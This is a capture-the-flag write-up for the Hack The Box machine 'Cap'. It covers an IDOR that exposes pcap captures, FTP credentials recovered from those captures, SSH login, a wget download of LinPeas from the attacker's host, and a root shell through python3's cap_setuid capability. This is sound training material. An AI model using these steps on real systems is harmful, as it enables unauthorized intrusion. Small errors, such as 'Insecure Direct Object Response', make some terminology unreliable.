# Hack The Box - Cap Write up

## Overview
- __Machine Name__ : Cap

- __Platform__ : Hack The Box

- __Difficulty__ : Easy

- __IP address__ : 10.129.57.59

## Enumeration

### Nmap Scan
nmap -sC -sV 10.129.57.59

### Findings
- 21/ftp

- 22/ssh

- 80/http

The webserver was hosting a dashboard application for monitoring packets.

## Web Enumeration
Brwosing the web application, it showed a security dashboard that include

- IP config

- Network status

- Security snapshot (file .pcap download)

The __.pcap__ file was interesting to see and analyse the captured network traffic.

###Vulnerability Discovery
While interacting with the application, I navigate to the security snapshot feature.

I observed that the URL contained a numeric ID parameter 1. 

/data/1

I manually modified the value.

/data/0

This allowed access to different capture files belonging to other session.

This behaviour shows an __Insecure Direct Object Response(IDOR)__ vulnerabilty access 

control checks are missing and user can acess to unauthorised resources by modifying

parameters.

### Exploitation
By analysing the .pcap file using Wireshark

I found FTP credentials in plaintext

username: nathan
password: 

### Initial Access
Using credentials, I logged in via SSH

ssh nathan@10.129.57.59

successfully gained a shell.

### Transferring Enumeration tool
Afer gaining ssh access as user nathan, I needed to perform local enumeration for 

privilege escalation. 

I transferred LinPeas from my machine to target machine.

#### Step 1: Start python HTTP Server (on my machine)
python3 -m http.server 80

This hosted linPeas.sh on my machine

#### Step 2: Download linPeas on target machine
On the target machine, I used

wget http://my_machine_ip:80/linPeas.sh

#### Step 3: Make it executable and run
chmod +x linPeas.sh

./linPeas.sh

This binary file will help me to find potential privilege escalation vectors.

### Privilege Escalation
After running linPeas.sh, I found 

/usr/bin/python3 = cap_setuid, cap_net_bin_service+ep

This means python can run with elevated privilege.

### Exploit
I used python to escalate privilege.

python3

import os;

os.setuid(0);

os.system('/bin/bash');

This spawned a root shell.

### Root access
Confirmed with:

id

Output:

uid=0(root) gid=0(root)

Root flag is obtained in its home directory.

### Lesson Learned
- IDOR vulnerabilty can expose sensitive data

- pcap files may contain credentials in plain text.

- Linux capabilities can be abused for privilege escalation.

### Tools used
- nmap

- wireshark

- ssh

- linpeas

### Conclusion
This machine demonstrates how small configuration (IDOR + pcap files) can lead to full system compromise.

